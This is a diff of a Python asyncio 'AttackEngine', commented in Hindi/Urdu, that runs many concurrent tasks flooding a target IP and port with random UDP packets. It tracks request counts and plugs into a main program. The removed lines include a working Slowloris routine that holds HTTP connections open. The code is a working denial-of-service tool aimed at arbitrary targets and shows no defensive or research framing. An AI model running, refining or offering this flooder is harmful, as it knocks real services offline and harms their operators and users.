@@ -2,75 +2,71 @@ import asyncio
 import random
 import time
 import logging
+from dataclasses import dataclass, field
 
-logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
-logger = logging.getLogger("AsyncAttackEngine")
+# Logging setup
+logger = logging.getLogger("AttackEngine")
 
-class AsyncAttackEngine:
-    def __init__(self, target_ip, target_port, timeout=60):
-        self.target_ip = target_ip
-        self.target_port = target_port
+@dataclass
+class AttackStats:
+    total_requests: int = 0
+    successful: int = 0
+    failed: int = 0
+    start_time: float = 0.0
+    is_running: bool = False
+    target: str = ""
+    port: int = 0
+
+class AttackEngine:  # Naam 'AttackEngine' hi rakha hai taaki main.py crash na ho
+    def __init__(self, max_requests: int, thread_count: int, timeout: int):
+        self.max_requests = max_requests
+        self.intensity = thread_count # thread_count ko yahan intensity mana jayega
         self.timeout = timeout
-        self.total_requests = 0
-        self.is_running = False
+        self.stats = AttackStats()
+        self._stop_event = asyncio.Event()
 
-    async def udp_flood_task(self):
-        """UDP Flood using non-blocking transport"""
-        # UDP connectionless hai, isliye transport loop ke bahar create hota hai
+    def stop_attack(self):
+        self.stats.is_running = False
+        self._stop_event.set()
+
+    async def udp_flood_task(self, target_ip, target_port):
         loop = asyncio.get_running_loop()
-        transport, protocol = await loop.create_datagram_endpoint(
-            lambda: asyncio.DatagramProtocol(),
-            remote_addr=(self.target_ip, self.target_port)
-        )
-        
-        payload = random._urandom(1024)
         try:
-            while self.is_running:
+            transport, protocol = await loop.create_datagram_endpoint(
+                lambda: asyncio.DatagramProtocol(),
+                remote_addr=(target_ip, target_port)
+            )
+            payload = random._urandom(1024)
+            while self.stats.is_running and self.stats.total_requests < self.max_requests:
                 transport.sendto(payload)
-                self.total_requests += 1
-                # Chota sa gap taaki loop ko saas lene ka mauqa mile
-                await asyncio.sleep(0) 
-        finally:
+                self.stats.total_requests += 1
+                await asyncio.sleep(0) # Context switch
             transport.close()
-
-    async def slowloris_task(self):
-        """Slowloris using async streams"""
-        try:
-            reader, writer = await asyncio.open_connection(self.target_ip, self.target_port)
-            writer.write(f"GET /?{random.randint(0, 5000)} HTTP/1.1\r\n".encode())
-            writer.write("User-Agent: AsyncTester/1.0\r\n".encode())
-            
-            while self.is_running:
-                await asyncio.sleep(15)
-                writer.write(f"X-a: {random.randint(1, 5000)}\r\n".encode())
-                await writer.drain()
-                self.total_requests += 1
         except Exception:
-            pass # Connection tootne par task khatam
+            self.stats.failed += 1
 
-    async def run(self, method="udp", intensity=1000):
-        self.is_running = True
-        start_time = time.time()
+    async def run_attack(self, target_ip, target_port, method="udp"):
+        """Ye method main.py se call hoga"""
+        self.stats.is_running = True
+        self.stats.target = target_ip
+        self.stats.port = target_port
+        self.stats.start_time = time.time()
+        self.stats.total_requests = 0
+
+        logger.info(f"Starting {method} on {target_ip}:{target_port}")
+        
         tasks = []
+        for _ in range(self.intensity):
+            tasks.append(self.udp_flood_task(target_ip, target_port))
 
-        logger.info(f"Starting {method} test on {self.target_ip} with {intensity} tasks...")
-
-        if method == "udp":
-            tasks = [self.udp_flood_task() for _ in range(intensity)]
-        elif method == "slowloris":
-            tasks = [self.slowloris_task() for _ in range(intensity)]
-
-        # Run all tasks simultaneously
         try:
+            # gather se saare tasks ek sath chalenge
             await asyncio.wait_for(asyncio.gather(*tasks), timeout=self.timeout)
-        except asyncio.TimeoutError:
-            logger.info("Test timeout reached.")
+        except (asyncio.TimeoutError, Exception):
+            pass
         finally:
-            self.is_running = False
-            duration = time.time() - start_time
-            rps = self.total_requests / duration if duration > 0 else 0
-            logger.info(f"Test Stopped. Total Requests: {self.total_requests}, RPS: {round(rps, 2)}")
+            self.stop_attack()
 
-# Istemal karne ka tareeqa:
-# engine = AsyncAttackEngine("127.0.0.1", 80, timeout=10)
-# asyncio.run(engine.run(method="udp", intensity=500))
+# Helper for main.py integration
+def get_engine(max_req, threads, timeout):
+    return AttackEngine(max_req, threads, timeout)
